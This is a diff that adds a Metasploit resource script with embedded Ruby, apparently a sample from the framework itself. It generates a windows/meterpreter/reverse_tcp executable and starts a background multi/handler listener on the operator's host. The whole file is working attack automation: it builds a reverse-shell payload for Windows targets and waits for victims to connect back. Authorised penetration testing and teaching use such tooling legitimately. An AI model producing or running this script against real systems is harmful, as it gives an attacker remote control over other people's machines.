@@ -1,0 +1,32 @@
+<ruby>
+PAYLOAD = 'windows/meterpreter/reverse_tcp'
+
+def payload_lhost
+  framework.datastore['LHOST'] || Rex::Socket.source_address
+end
+
+def payload_lport
+  framework.datastore['LPORT'] || 4444
+end
+
+def out_path
+  "#{Msf::Config::local_directory}/meterpreter_reverse_tcp.exe"
+end
+
+# Please see:
+# https://github.com/rapid7/metasploit-framework/issues/7603
+sleep(1)
+
+run_single("use payload/#{PAYLOAD}")
+run_single("set lhost #{payload_lhost}")
+run_single("set lport #{payload_lport}")
+run_single("generate -t exe -f #{out_path}")
+print_status("#{PAYLOAD}'s LHOST=#{payload_lhost}, LPORT=#{payload_lport}")
+print_status("#{PAYLOAD} is at #{out_path}")
+run_single('use exploit/multi/handler')
+run_single("set payload #{PAYLOAD}")
+run_single("set lhost #{payload_lhost}")
+run_single("set lport #{payload_lport}")
+run_single('set exitonsession false')
+run_single('run -j')
+</ruby>
